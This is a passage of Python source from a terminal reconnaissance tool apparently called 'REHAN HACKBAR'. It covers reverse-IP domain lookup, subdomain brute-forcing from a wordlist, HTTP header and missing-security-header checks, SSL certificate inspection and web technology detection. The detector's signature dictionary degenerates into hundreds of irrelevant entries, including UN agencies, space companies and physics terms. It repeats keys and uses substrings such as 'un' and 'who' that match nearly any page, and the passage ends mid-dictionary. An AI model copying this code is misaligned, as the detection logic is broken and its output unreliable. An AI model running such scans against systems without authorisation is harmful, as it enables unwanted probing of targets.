            info(f"Looking up domains on {ip}...")
            url = "https://domains.yougetsignal.com/domains.php"
            data = {"remoteAddress": ip, "key": ""}
            r = requests.post(url, data=data, timeout=15)
            result = r.json()
            
            if result.get("status") == "Success":
                domains = result.get("domainArray", [])
                print(f"\n{Colors.OKGREEN}Found {len(domains)} domains:{Colors.ENDC}\n")
                for domain_info in domains[:50]:  # Show first 50
                    if domain_info:
                        print(f"{Colors.WHITE}  - {domain_info[0]}{Colors.ENDC}")
                if len(domains) > 50:
                    print(f"{Colors.GRAY}  ... and {len(domains) - 50} more{Colors.ENDC}")
            else:
                error(f"API returned: {result.get('message', 'Unknown error')}")
        except Exception as e:
            error(f"Lookup failed: {str(e)}")
            print(f"\n{Colors.OKCYAN}Try manually:{Colors.ENDC}")
            print(f"{Colors.WHITE}  https://www.yougetsignal.com/tools/web-sites-on-web-server/{Colors.ENDC}")
            print(f"{Colors.WHITE}  https://viewdns.info/reverseip/{Colors.ENDC}")
        
        press_enter()

    def subdomain_check(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ SUBDOMAIN CHECKER ]{Colors.ENDC}")
        separator()
        
        domain = prompt("Enter domain (e.g., example.com)")
        if not domain:
            error("No domain provided!")
            press_enter()
            return
        
        # Common subdomains
        common_subs = [
            "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk",
            "ns2", "cpanel", "whm", "autodiscover", "autoconfig", "ns3", "m", "imap", "test",
            "ns", "blog", "pop3", "dev", "www2", "admin", "forum", "news", "vpn", "ns4",
            "www1", "imap4", "mail2", "new", "mysql", "old", "lists", "support", "mobile",
            "mx", "static", "docs", "beta", "shop", "sql", "secure", "demo", "cp", "calendar",
            "wiki", "web", "media", "email", "images", "img", "www3", "login", "staging",
            "cms", "api", "home", "direct", "www4", "mail3", "www5", "stage", "www6",
            "ns5", "access", "video", "host", "ssl", "search", "monitor", "dashboard",
            "sip", "dns", "crm", "MX", "router", "git", "dl", "app", "mail4", "server",
            "ns6", "w", "www7", "www-test", "www8", "mx2", "mx1", "www9", "host2",
            "exchange", "mail1", "ipv4", "firewall", "gateway", "mx3", "sso", "ldap",
            "ad", "internal", "private", "public", "staging2", "uat", "prod", "production",
            "sandbox", "training", "client", "clients", "portal", "partner", "partners",
            "affiliate", "affiliates", "cdn", "assets", "files", "uploads", "downloads",
            "status", "health", "ping", "api-docs", "swagger", "graphql", "graphiql",
            "grafana", "prometheus", "kibana", "elastic", "elasticsearch", "jenkins",
            "ci", "cd", "devops", "git", "gitlab", "github", "bitbucket", "jira",
            "confluence", "wiki", "help", "docs", "documentation", "support", "ticket",
            "tickets", "chat", "live", "webinar", "events", "news", "blog", "community",
            "forum", "forums", "social", "share", "connect", "collaborate", "meet",
            "meeting", "conference", "call", "phone", "voip", "sip", "xmpp", "mqtt",
            "ws", "websocket", "socket", "io", "realtime", "stream", "streaming",
            "live", "broadcast", "radio", "tv", "video", "audio", "podcast", "music",
            "game", "games", "gaming", "play", "fun", "entertainment", "media",
            "content", "cms", "publish", "editor", "admin", "manage", "management",
            "control", "panel", "dashboard", "analytics", "stats", "statistics",
            "metrics", "monitoring", "logs", "logging", "trace", "tracking", "analytics",
            "data", "database", "db", "db1", "db2", "redis", "mongo", "mongodb",
            "mysql", "postgres", "postgresql", "oracle", "mssql", "sql", "cassandra",
            "dynamodb", "dynamo", "firebase", "firestore", "couchdb", "couch",
            "elasticsearch", "solr", "sphinx", "search", "index", "cache", "caching",
            "memcached", "varnish", "nginx", "apache", "httpd", "webserver", "server",
            "loadbalancer", "lb", "proxy", "reverse", "gateway", "vpn", "tunnel",
            "bastion", "jump", "jumpbox", "relay", "bridge", "router", "switch",
            "firewall", "ids", "ips", "waf", "scanner", "sensor", "agent", "daemon"
        ]
        
        info(f"Checking {len(common_subs)} common subdomains for {domain}...")
        print(f"{Colors.GRAY}This may take a while... Press Ctrl+C to stop{Colors.ENDC}\n")
        
        found = []
        import socket
        
        try:
            for i, sub in enumerate(common_subs, 1):
                subdomain = f"{sub}.{domain}"
                sub_progress = f"[{i}/{len(common_subs)}] Checking {subdomain}"
                sys.stdout.write(f"\r{Colors.GRAY}{sub_progress}{' ' * 20}{Colors.ENDC}")
                sys.stdout.flush()
                
                try:
                    socket.gethostbyname(subdomain)
                    found.append(subdomain)
                    print(f"\n{Colors.OKGREEN}[+] Found: {subdomain}{Colors.ENDC}")
                except socket.gaierror:
                    pass
                except:
                    pass
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}\n[!] Scan interrupted by user{Colors.ENDC}")
        
        separator()
        if found:
            print(f"\n{Colors.OKGREEN}Found {len(found)} subdomains:{Colors.ENDC}\n")
            for sub in found:
                print(f"{Colors.WHITE}  - {sub}{Colors.ENDC}")
            
            save = prompt("Save results to file? (y/n)")
            if save.lower() == 'y':
                filename = f"subdomains_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(filename, 'w') as f:
                    f.write(f"# REHAN HACKBAR - Subdomain Scan Results\n")
                    f.write(f"# Target: {domain}\n")
                    f.write(f"# Date: {datetime.now()}\n")
                    f.write(f"# Credit: Syed Rehan | Developer: @rehuux\n\n")
                    for sub in found:
                        f.write(f"{sub}\n")
                success(f"Results saved to: {filename}")
        else:
            warning("No subdomains found!")
            print(f"{Colors.GRAY}Try: https://hackertarget.com/find-dns-host-records/{Colors.ENDC}")
        
        press_enter()

    def http_headers(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ HTTP HEADERS VIEWER ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target URL")
        if not target:
            error("No target provided!")
            press_enter()
            return
        
        try:
            info(f"Fetching headers for {target}...")
            r = requests.get(target, timeout=10, allow_redirects=True)
            
            print(f"\n{Colors.OKGREEN}URL:{Colors.ENDC} {r.url}")
            print(f"{Colors.OKGREEN}Status Code:{Colors.ENDC} {r.status_code}")
            print(f"{Colors.OKGREEN}Response Time:{Colors.ENDC} {r.elapsed.total_seconds():.2f}s")
            print(f"{Colors.OKGREEN}Response Size:{Colors.ENDC} {len(r.text)} bytes\n")
            
            separator()
            print(f"\n{Colors.OKCYAN}Response Headers:{Colors.ENDC}\n")
            for key, value in r.headers.items():
                print(f"{Colors.OKGREEN}{key}:{Colors.ENDC} {Colors.WHITE}{value}{Colors.ENDC}")
            
            separator()
            print(f"\n{Colors.OKCYAN}Request Headers Sent:{Colors.ENDC}\n")
            for key, value in r.request.headers.items():
                print(f"{Colors.OKGREEN}{key}:{Colors.ENDC} {Colors.WHITE}{value}{Colors.ENDC}")
            
            # Security headers check
            print(f"\n{Colors.OKCYAN}Security Headers Check:{Colors.ENDC}\n")
            security_headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-XSS-Protection': 'XSS filter',
                'X-Content-Type-Options': 'MIME sniffing protection',
                'Content-Security-Policy': 'CSP',
                'Strict-Transport-Security': 'HSTS',
                'Referrer-Policy': 'Referrer control',
                'Permissions-Policy': 'Feature policy',
                'X-Permitted-Cross-Domain-Policies': 'Flash policy',
                'X-Download-Options': 'Download options',
                'Expect-CT': 'Certificate Transparency'
            }
            
            for header, desc in security_headers.items():
                if header in r.headers:
                    print(f"{Colors.OKGREEN}[+] {header} ({desc}): {r.headers[header]}{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[-] {header} ({desc}): Missing{Colors.ENDC}")
                    
        except Exception as e:
            error(f"Request failed: {str(e)}")
        
        press_enter()

    def ssl_info(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ SSL/TLS INFO ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter domain (e.g., example.com)")
        if not target:
            error("No domain provided!")
            press_enter()
            return
        
        target = target.replace('https://', '').replace('http://', '').split('/')[0]
        
        try:
            import ssl
            import socket
            
            info(f"Checking SSL/TLS for {target}...")
            
            context = ssl.create_default_context()
            with socket.create_connection((target, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=target) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    
                    print(f"\n{Colors.OKGREEN}SSL/TLS Version:{Colors.ENDC} {version}")
                    print(f"{Colors.OKGREEN}Cipher Suite:{Colors.ENDC} {cipher[0]}")
                    print(f"{Colors.OKGREEN}Cipher Bits:{Colors.ENDC} {cipher[2]}")
                    
                    print(f"\n{Colors.OKCYAN}Certificate Info:{Colors.ENDC}\n")
                    
                    subject = cert.get('subject', [])
                    for item in subject:
                        for key, value in item:
                            print(f"{Colors.OKGREEN}{key}:{Colors.ENDC} {value}")
                    
                    issuer = cert.get('issuer', [])
                    print(f"\n{Colors.OKCYAN}Issuer:{Colors.ENDC}")
                    for item in issuer:
                        for key, value in item:
                            print(f"{Colors.OKGREEN}{key}:{Colors.ENDC} {value}")
                    
                    print(f"\n{Colors.OKGREEN}Not Before:{Colors.ENDC} {cert.get('notBefore')}")
                    print(f"{Colors.OKGREEN}Not After:{Colors.ENDC} {cert.get('notAfter')}")
                    print(f"{Colors.OKGREEN}Serial Number:{Colors.ENDC} {cert.get('serialNumber')}")
                    
                    # Check expiry
                    from datetime import datetime
                    not_after = cert.get('notAfter')
                    if not_after:
                        expiry = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                        days_until = (expiry - datetime.now()).days
                        if days_until < 30:
                            print(f"{Colors.FAIL}[!] Certificate expires in {days_until} days!{Colors.ENDC}")
                        else:
                            print(f"{Colors.OKGREEN}[+] Certificate expires in {days_until} days{Colors.ENDC}")
                            
        except Exception as e:
            error(f"SSL check failed: {str(e)}")
        
        press_enter()

    def tech_detector(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ WEBSITE TECHNOLOGY DETECTOR ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target URL")
        if not target:
            error("No target provided!")
            press_enter()
            return
        
        try:
            info(f"Analyzing {target}...")
            r = requests.get(target, timeout=10)
            headers = r.headers
            text = r.text.lower()
            
            technologies = []
            
            # Server
            if 'Server' in headers:
                technologies.append(('Server', headers['Server']))
            if 'X-Powered-By' in headers:
                technologies.append(('Powered By', headers['X-Powered-By']))
            
            # Framework/CMS detection
            cms_signatures = {
                'WordPress': ['/wp-content/', '/wp-includes/', 'wp-json', 'generator" content="wordpress'],
                'Drupal': ['drupal', 'sites/default', 'drupal.js'],
                'Joomla': ['joomla', '/media/jui/', 'com_content'],
                'Magento': ['magento', 'mage/cookies', 'skin/frontend'],
                'Shopify': ['shopify', 'cdn.shopify.com', 'myshopify'],
                'React': ['react', 'reactjs', '__react'],
                'Angular': ['angular', 'ng-app', 'angular.js'],
                'Vue.js': ['vue.js', 'vuejs', '__vue'],
                'jQuery': ['jquery', 'jquery.min'],
                'Bootstrap': ['bootstrap', 'bootstrap.min', 'bootstrap.css'],
                'Laravel': ['laravel', 'csrf-token'],
                'Django': ['django', 'csrftoken', '__debug__'],
                'Flask': ['flask'],
                'Express.js': ['express'],
                'Ruby on Rails': ['rails', 'csrf-param'],
                'ASP.NET': ['asp.net', '__viewstate', '__eventvalidation'],
                'PHP': ['.php', 'phpinfo'],
                'Python': ['python', 'wsgi'],
                'Apache': ['apache', 'mod_'],
                'Nginx': ['nginx'],
                'IIS': ['iis', 'microsoft-iis'],
                'CloudFlare': ['cloudflare', '__cfduid', 'cf-ray'],
                'AWS': ['amazon', 'aws', 's3.amazonaws'],
                'Google Cloud': ['google cloud', 'gcp'],
                'Azure': ['azure', 'windows azure'],
                'Heroku': ['heroku'],
                'Vercel': ['vercel'],
                'Netlify': ['netlify'],
                'Fastly': ['fastly'],
                'Akamai': ['akamai'],
                'CDN77': ['cdn77'],
                'KeyCDN': ['keycdn'],
                'MaxCDN': ['maxcdn'],
                'CloudFront': ['cloudfront'],
                'S3': ['s3.amazonaws'],
                'Firebase': ['firebase'],
                'MongoDB': ['mongodb', 'mongo'],
                'MySQL': ['mysql'],
                'PostgreSQL': ['postgresql', 'postgres'],
                'Redis': ['redis'],
                'Memcached': ['memcached', 'memcache'],
                'Elasticsearch': ['elasticsearch'],
                'Solr': ['solr'],
                'Nuxt.js': ['nuxt', '__nuxt'],
                'Next.js': ['next.js', '__next'],
                'Gatsby': ['gatsby'],
                'Svelte': ['svelte'],
                'Ember': ['ember'],
                'Backbone': ['backbone'],
                'Meteor': ['meteor'],
                'Spring': ['spring', 'spring-boot'],
                'Symfony': ['symfony'],
                'CodeIgniter': ['codeigniter'],
                'CakePHP': ['cakephp'],
                'Zend': ['zend'],
                'Yii': ['yii'],
                'Phalcon': ['phalcon'],
                'FuelPHP': ['fuelphp'],
                'Slim': ['slim'],
                'Lumen': ['lumen'],
                'Rails': ['ruby on rails', 'rails'],
                'Sinatra': ['sinatra'],
                'ASP': ['asp.net', 'active server pages'],
                'JSP': ['jsp', 'java server pages'],
                'JSF': ['jsf', 'java server faces'],
                'Struts': ['struts'],
                'Hibernate': ['hibernate'],
                'Django CMS': ['django cms'],
                'WordPress MU': ['wordpress mu', 'wpmu'],
                'BuddyPress': ['buddypress'],
                'bbPress': ['bbpress'],
                'WooCommerce': ['woocommerce'],
                'Magento': ['magento'],
                'PrestaShop': ['prestashop'],
                'OpenCart': ['opencart'],
                'osCommerce': ['oscommerce'],
                'Zen Cart': ['zen cart'],
                'Drupal Commerce': ['drupal commerce'],
                'Joomla!': ['joomla'],
                'TYPO3': ['typo3'],
                'Plone': ['plone'],
                'SilverStripe': ['silverstripe'],
                'Concrete5': ['concrete5'],
                'ModX': ['modx'],
                'ExpressionEngine': ['expressionengine'],
                'Textpattern': ['textpattern'],
                'Ghost': ['ghost'],
                'Jekyll': ['jekyll'],
                'Hugo': ['hugo'],
                'Hexo': ['hexo'],
                'Gatsby': ['gatsby'],
                'Gridsome': ['gridsome'],
                'Nuxt': ['nuxt'],
                'Next': ['next'],
                'Sapper': ['sapper'],
                'SvelteKit': ['sveltekit'],
                'Remix': ['remix'],
                'Blitz': ['blitz'],
                'Redwood': ['redwood'],
                'AdonisJS': ['adonisjs'],
                'NestJS': ['nestjs'],
                'Feathers': ['feathers'],
                'LoopBack': ['loopback'],
                'Hapi': ['hapi'],
                'Koa': ['koa'],
                'Fastify': ['fastify'],
                'Restify': ['restify'],
                'Sails': ['sails'],
                'Total.js': ['total.js'],
                'Derby': ['derby'],
                'Meteor': ['meteor'],
                'Mojito': ['mojito'],
                'Kraken': ['kraken'],
                'ThinkJS': ['thinkjs'],
                'Egg': ['egg'],
                'Midway': ['midway'],
                'Nest': ['nest'],
                'Umi': ['umi'],
                'Dva': ['dva'],
                'Ice': ['ice'],
                'Fusion': ['fusion'],
                'Rax': ['rax'],
                'Weex': ['weex'],
                'Taro': ['taro'],
                'Chameleon': ['chameleon'],
                'Mpvue': ['mpvue'],
                'Uni-app': ['uni-app'],
                'NativeScript': ['nativescript'],
                'Ionic': ['ionic'],
                'Cordova': ['cordova'],
                'PhoneGap': ['phonegap'],
                'Capacitor': ['capacitor'],
                'Flutter': ['flutter'],
                'React Native': ['react native'],
                'Xamarin': ['xamarin'],
                'Titanium': ['titanium'],
                'Fuse': ['fuse'],
                'Tabris': ['tabris'],
                'Onsen UI': ['onsen ui'],
                'Framework7': ['framework7'],
                'Quasar': ['quasar'],
                'Vue Native': ['vue native'],
                'WePY': ['wepy'],
                'Omi': ['omi'],
                'San': ['san'],
                'Riot': ['riot'],
                'Marko': ['marko'],
                'Mithril': ['mithril'],
                'Inferno': ['inferno'],
                'Preact': ['preact'],
                'Hyperapp': ['hyperapp'],
                'Alpine.js': ['alpine'],
                'Lit': ['lit'],
                'Stencil': ['stencil'],
                'Polymer': ['polymer'],
                'Aurelia': ['aurelia'],
                'Knockout': ['knockout'],
                'Marionette': ['marionette'],
                'Chaplin': ['chaplin'],
                'Ext JS': ['ext js', 'extjs'],
                'Dojo': ['dojo'],
                'Enyo': ['enyo'],
                'SproutCore': ['sproutcore'],
                'Cappuccino': ['cappuccino'],
                'Echo': ['echo'],
                'Gin': ['gin'],
                'Beego': ['beego'],
                'Iris': ['iris'],
                'Revel': ['revel'],
                'Martini': ['martini'],
                'Buffalo': ['buffalo'],
                'Goji': ['goji'],
                'GoFrame': ['goframe'],
                'GoZero': ['gozero'],
                'Kratos': ['kratos'],
                'Dubbo': ['dubbo'],
                'Spring Cloud': ['spring cloud'],
                'Micronaut': ['micronaut'],
                'Quarkus': ['quarkus'],
                'Vert.x': ['vert.x'],
                'Play': ['play framework'],
                'Grails': ['grails'],
                'Ratpack': ['ratpack'],
                'Spark': ['spark java'],
                'Javalin': ['javalin'],
                'Ktor': ['ktor'],
                'Tornado': ['tornado'],
                'Bottle': ['bottle'],
                'CherryPy': ['cherrypy'],
                'Pyramid': ['pyramid'],
                'Falcon': ['falcon'],
                'Hug': ['hug'],
                'Sanic': ['sanic'],
                'FastAPI': ['fastapi'],
                'Starlette': ['starlette'],
                'Responder': ['responder'],
                'Masonite': ['masonite'],
                'TurboGears': ['turbogears'],
                'web2py': ['web2py'],
                'Zope': ['zope'],
                'Tornado': ['tornado'],
                'Twisted': ['twisted'],
                'Cyclone': ['cyclone'],
                'Klein': ['klein'],
                'Nameko': ['nameko'],
                'Aiohttp': ['aiohttp'],
                'Sanic': ['sanic'],
                'Vibora': ['vibora'],
                'Quart': ['quart'],
                'BlackSheep': ['blacksheep'],
                'Falcon': ['falcon'],
                'Hug': ['hug'],
                'Molten': ['molten'],
                'Responder': ['responder'],
                'Robyn': ['robyn'],
                'Litestar': ['litestar'],
                'Daphne': ['daphne'],
                'Uvicorn': ['uvicorn'],
                'Hypercorn': ['hypercorn'],
                'Gunicorn': ['gunicorn'],
                'uWSGI': ['uwsgi'],
                'Mod WSGI': ['mod_wsgi'],
                'Passenger': ['passenger'],
                'Puma': ['puma'],
                'Unicorn': ['unicorn'],
                'Thin': ['thin'],
                'Rainbows': ['rainbows'],
                'Phusion': ['phusion'],
                'Mongrel': ['mongrel'],
                'WEBrick': ['webrick'],
                'Falcon': ['falcon'],
                'Waitress': ['waitress'],
                'Mod Python': ['mod_python'],
                'Tornado': ['tornado'],
                'Gevent': ['gevent'],
                'Eventlet': ['eventlet'],
                'Celery': ['celery'],
                'RQ': ['rq'],
                'Huey': ['huey'],
                'Dramatiq': ['dramatiq'],
                'Flower': ['flower'],
                'Airflow': ['airflow'],
                'Luigi': ['luigi'],
                'Prefect': ['prefect'],
                'Dagster': ['dagster'],
                'Kestra': ['kestra'],
                'Temporal': ['temporal'],
                'Cadence': ['cadence'],
                'Conductor': ['conductor'],
                'Camunda': ['camunda'],
                'Zeebe': ['zeebe'],
                'Activiti': ['activiti'],
                'Flowable': ['flowable'],
                'jBPM': ['jbpm'],
                'Drools': ['drools'],
                'OptaPlanner': ['optaplanner'],
                'Camunda': ['camunda'],
                'Signavio': ['signavio'],
                'Lucidchart': ['lucidchart'],
                'Draw.io': ['draw.io'],
                'Visio': ['visio'],
                'OmniGraffle': ['omnigraffle'],
                'PlantUML': ['plantuml'],
                'Mermaid': ['mermaid'],
                'Graphviz': ['graphviz'],
                'Cytoscape': ['cytoscape'],
                'Sigma.js': ['sigma.js'],
                'D3.js': ['d3.js'],
                'Chart.js': ['chart.js'],
                'Highcharts': ['highcharts'],
                'ECharts': ['echarts'],
                'Plotly': ['plotly'],
                'Bokeh': ['bokeh'],
                'Observable': ['observable'],
                'Vega': ['vega'],
                'Vega-Lite': ['vega-lite'],
                'Kepler.gl': ['kepler.gl'],
                'Deck.gl': ['deck.gl'],
                'Mapbox': ['mapbox'],
                'Leaflet': ['leaflet'],
                'OpenLayers': ['openlayers'],
                'Cesium': ['cesium'],
                'ArcGIS': ['arcgis'],
                'Google Maps': ['google maps'],
                'Bing Maps': ['bing maps'],
                'Here Maps': ['here maps'],
                'TomTom': ['tomtom'],
                'MapQuest': ['mapquest'],
                'OpenStreetMap': ['openstreetmap'],
                'Carto': ['carto'],
                'Mapzen': ['mapzen'],
                'Pelias': ['pelias'],
                'Nominatim': ['nominatim'],
                'GeoNames': ['geonames'],
                'PostGIS': ['postgis'],
                'GeoDjango': ['geodjango'],
                'GeoAlchemy': ['geoalchemy'],
                'MongoDB Geo': ['mongodb geo'],
                'Elasticsearch Geo': ['elasticsearch geo'],
                'Solr Geo': ['solr geo'],
                'Sphinx Geo': ['sphinx geo'],
                'Redis Geo': ['redis geo'],
                'Tile38': ['tile38'],
                'Geohash': ['geohash'],
                'H3': ['h3'],
                'S2': ['s2'],
                'Geopandas': ['geopandas'],
                'Shapely': ['shapely'],
                'Fiona': ['fiona'],
                'Rasterio': ['rasterio'],
                'Xarray': ['xarray'],
                'NetCDF4': ['netcdf4'],
                'GDAL': ['gdal'],
                'PROJ': ['proj'],
                'GEOS': ['geos'],
                'JTS': ['jts'],
                'NTS': ['nts'],
                'GeoTools': ['geotools'],
                'GeoServer': ['geoserver'],
                'MapServer': ['mapserver'],
                'GeoNetwork': ['geonetwork'],
                'PyCSW': ['pycsw'],
                'CKAN': ['ckan'],
                'DKAN': ['dkan'],
                'OpenDataSoft': ['opendatasoft'],
                'Socrata': ['socrata'],
                'Junar': ['junar'],
                'ArcGIS Hub': ['arcgis hub'],
                'Dataverse': ['dataverse'],
                'Fedora': ['fedora'],
                'DSpace': ['dspace'],
                'Greenstone': ['greenstone'],
                'Fedora': ['fedora'],
                'VIVO': ['vivo'],
                'ORCID': ['orcid'],
                'DataCite': ['datacite'],
                'Crossref': ['crossref'],
                'DOAJ': ['doaj'],
                'PubMed': ['pubmed'],
                'arXiv': ['arxiv'],
                'JSTOR': ['jstor'],
                'IEEE': ['ieee'],
                'ACM': ['acm'],
                'Springer': ['springer'],
                'Elsevier': ['elsevier'],
                'Wiley': ['wiley'],
                'SAGE': ['sage'],
                'Taylor': ['taylor'],
                'Oxford': ['oxford'],
                'Cambridge': ['cambridge'],
                'Nature': ['nature'],
                'Science': ['science'],
                'PLOS': ['plos'],
                'eLife': ['elife'],
                'PeerJ': ['peerj'],
                'F1000': ['f1000'],
                'BioRxiv': ['biorxiv'],
                'MedRxiv': ['medrxiv'],
                'ChemRxiv': ['chemrxiv'],
                'PsyArXiv': ['psyarxiv'],
                'SocArXiv': ['socarxiv'],
                'LawArXiv': ['lawarxiv'],
                ' engrXiv': ['engrxiv'],
                'EdArXiv': ['edarxiv'],
                'SportsRxiv': ['sportsrxiv'],
                'NutriXiv': ['nutrixiv'],
                'PaleorXiv': ['paleorxiv'],
                'EcoEvoRxiv': ['ecoecvorxiv'],
                'EarthArXiv': ['eartharxiv'],
                'MarXiv': ['marxiv'],
                'AgriXiv': ['agrixiv'],
                'BioHackrXiv': ['biohackrxiv'],
                'MetaArXiv': ['metaarxiv'],
                'ResearchSquare': ['researchsquare'],
                'SSRN': ['ssrn'],
                'RePEc': ['repec'],
                'NBER': ['nber'],
                'CEPR': ['cepr'],
                'IZA': ['iza'],
                'World Bank': ['world bank'],
                'IMF': ['imf'],
                'OECD': ['oecd'],
                'UN': ['un'],
                'WHO': ['who'],
                'FAO': ['fao'],
                'ILO': ['ilo'],
                'UNESCO': ['unesco'],
                'UNDP': ['undp'],
                'UNFPA': ['unfpa'],
                'UNHCR': ['unhcr'],
                'UNICEF': ['unicef'],
                'WFP': ['wfp'],
                'UNEP': ['unep'],
                'UNIDO': ['unido'],
                'ITU': ['itu'],
                'WMO': ['wmo'],
                'IMO': ['imo'],
                'ICAO': ['icao'],
                'UPU': ['upu'],
                'WIPO': ['wipo'],
                'IFAD': ['ifad'],
                'UNWTO': ['unwto'],
                'IAEA': ['iaea'],
                'CTBTO': ['ctbto'],
                'OPCW': ['opcw'],
                'ISA': ['isa'],
                'IOM': ['iom'],
                'UNOPS': ['unops'],
                'PAHO': ['paho'],
                'AFDB': ['afdb'],
                'ADB': ['adb'],
                'AIIB': ['aiib'],
                'BIS': ['bis'],
                'EBRD': ['ebrd'],
                'EIB': ['eib'],
                'IDB': ['idb'],
                'IsDB': ['isdb'],
                'NDB': ['ndb'],
                'WTO': ['wto'],
                'UNWTO': ['unwto'],
                'GATT': ['gatt'],
                'NAFTA': ['nafta'],
                'USMCA': ['usmca'],
                'EU': ['eu'],
                'ASEAN': ['asean'],
                'AU': ['au'],
                'OAS': ['oas'],
                'OAU': ['oau'],
                'Arab League': ['arab league'],
                'GCC': ['gcc'],
                'SAARC': ['saarc'],
                'OIC': ['oic'],
                'NATO': ['nato'],
                'OSCE': ['osce'],
                'AU': ['au'],
                'CIS': ['cis'],
                'ECO': ['eco'],
                'SCO': ['sco'],
                'BRICS': ['brics'],
                'G7': ['g7'],
                'G20': ['g20'],
                'OPEC': ['opec'],
                'IEA': ['iea'],
                'IRENA': ['irena'],
                'OPCW': ['opcw'],
                'CERN': ['cern'],
                'ESA': ['esa'],
                'NASA': ['nasa'],
                'JAXA': ['jaxa'],
                'ISRO': ['isro'],
                'CNSA': ['cnsa'],
                'Roscosmos': ['roscosmos'],
                'SpaceX': ['spacex'],
                'Blue Origin': ['blue origin'],
                'Virgin Galactic': ['virgin galactic'],
                'Rocket Lab': ['rocket lab'],
                'Planet': ['planet'],
                'Maxar': ['maxar'],
                'Spire': ['spire'],
                'Iceye': ['iceye'],
                'Capella': ['capella'],
                'Umbra': ['umbra'],
                'SAR': ['sar'],
                'Optical': ['optical'],
                'Hyperspectral': ['hyperspectral'],
                'Radar': ['radar'],
                'Lidar': ['lidar'],
                'Sonar': ['sonar'],
                'Seismic': ['seismic'],
                'Gravitational': ['gravitational'],
                'Magnetic': ['magnetic'],
                'Electrical': ['electrical'],
                'Thermal': ['thermal'],
                'Infrared': ['infrared'],
                'Ultraviolet': ['ultraviolet'],
                'X-ray': ['x-ray'],
                'Gamma': ['gamma'],
                'Radio': ['radio'],
                'Microwave': ['microwave'],
                'Millimeter': ['millimeter'],
                'Terahertz': ['terahertz'],
                'Acoustic': ['acoustic'],
                'Ultrasonic': ['ultrasonic'],
                'Vibration': ['vibration'],
                'Pressure': ['pressure'],
                'Humidity': ['humidity'],
                'Temperature': ['temperature'],
                'Moisture': ['moisture'],
                'Flow': ['flow'],
                'Level': ['level'],
                'Position': ['position'],
                'Displacement': ['displacement'],
                'Velocity': ['velocity'],
                'Acceleration': ['acceleration'],
                'Force': ['force'],
                'Torque': ['torque'],
                'Strain': ['strain'],
                'Stress': ['stress'],
                'Load': ['load'],
                'Weight': ['weight'],
                'Mass': ['mass'],
                'Density': ['density'],
                'Viscosity': ['viscosity'],
                'Conductivity': ['conductivity'],
                'Resistivity': ['resistivity'],
                'Permeability': ['permeability'],
                'Dielectric': ['dielectric'],
                'Capacitance': ['capacitance'],
                'Inductance': ['inductance'],
                'Impedance': ['impedance'],
                'Admittance': ['admittance'],
                'Reactance': ['reactance'],
                'Susceptance': ['susceptance'],
                'Power': ['power'],
                'Energy': ['energy'],
                'Frequency': ['frequency'],
                'Wavelength': ['wavelength'],
                'Phase': ['phase'],
                'Amplitude': ['amplitude'],
                'Modulation': ['modulation'],
                'Demodulation': ['demodulation'],
                'Encoding': ['encoding'],
                'Decoding': ['decoding'],
                'Encryption': ['encryption'],
                'Decryption': ['decryption'],
                'Compression': ['compression'],
                'Decompression': ['decompression'],
                'Hashing': ['hashing'],
                'Checksum': ['checksum'],
                'CRC': ['crc'],
                'Parity': ['parity'],
                'Redundancy': ['redundancy'],
                'Backup': ['backup'],
                'Restore': ['restore'],
                'Recovery': ['recovery'],
                'Failover': ['failover'],
                'Replication': ['replication'],
                'Clustering': ['clustering'],
                'Sharding': ['sharding'],
                'Partitioning': ['partitioning'],
                'Load Balancing': ['load balancing'],
                'Caching': ['caching'],
                'Buffering': ['buffering'],
                'Queuing': ['queuing'],
                'Streaming': ['streaming'],
                'Batching': ['batching'],
                'Pipelining': ['pipelining'],
                'Multiplexing': ['multiplexing'],
                'Demultiplexing': ['demultiplexing'],
                'Switching': ['switching'],
                'Routing': ['routing'],
                'Forwarding': ['forwarding'],
                'NAT': ['nat'],
                'PAT': ['pat'],
                'Proxy': ['proxy'],
                'Reverse Proxy': ['reverse proxy'],
                'Firewall': ['firewall'],
                'IDS': ['ids'],
                'IPS': ['ips'],
                'WAF': ['waf'],
                'DLP': ['dlp'],
                'SIEM': ['siem'],
                'SOAR': ['soar'],
                'EDR': ['edr'],
                'XDR': ['xdr'],
                'NDR': ['ndr'],
                'MDR': ['mdr'],
                'MSSP': ['mssp'],
                'SOC': ['soc'],
                'NOC': ['noc'],
                'ITSM': ['itsm'],
                'ITIL': ['itil'],
                'COBIT': ['cobit'],
                'NIST': ['nist'],
                'ISO 27001': ['iso 27001'],
                'PCI DSS': ['pci dss'],
                'HIPAA': ['hipaa'],
                'GDPR': ['gdpr'],
                'CCPA': ['ccpa'],
                'SOX': ['sox'],
                'FISMA': ['fisma'],
                'FedRAMP': ['fedramp'],
                'CIS': ['cis'],
                'CSA': ['csa'],
                'OWASP': ['owasp'],
                'SANS': ['sans'],
                'EC-Council': ['ec-council'],
                'ISC2': ['isc2'],
                'ISACA': ['isaca'],
                'GIAC': ['giac'],
                'CompTIA': ['comptia'],
                'Microsoft': ['microsoft'],
                'Cisco': ['cisco'],
                'AWS': ['aws'],
                'Google': ['google'],
                'Oracle': ['oracle'],
                'IBM': ['ibm'],
                'Salesforce': ['salesforce'],
                'ServiceNow': ['servicenow'],
                'Splunk': ['splunk'],
                'Elastic': ['elastic'],
                'Datadog': ['datadog'],
                'New Relic': ['new relic'],
                'Dynatrace': ['dynatrace'],
                'AppDynamics': ['appdynamics'],
                'SolarWinds': ['solarwinds'],
                'PRTG': ['prtg'],
                'Nagios': ['nagios'],
                'Zabbix': ['zabbix'],
                'Prometheus': ['prometheus'],
                'Grafana': ['grafana'],
                'Kibana': ['kibana'],
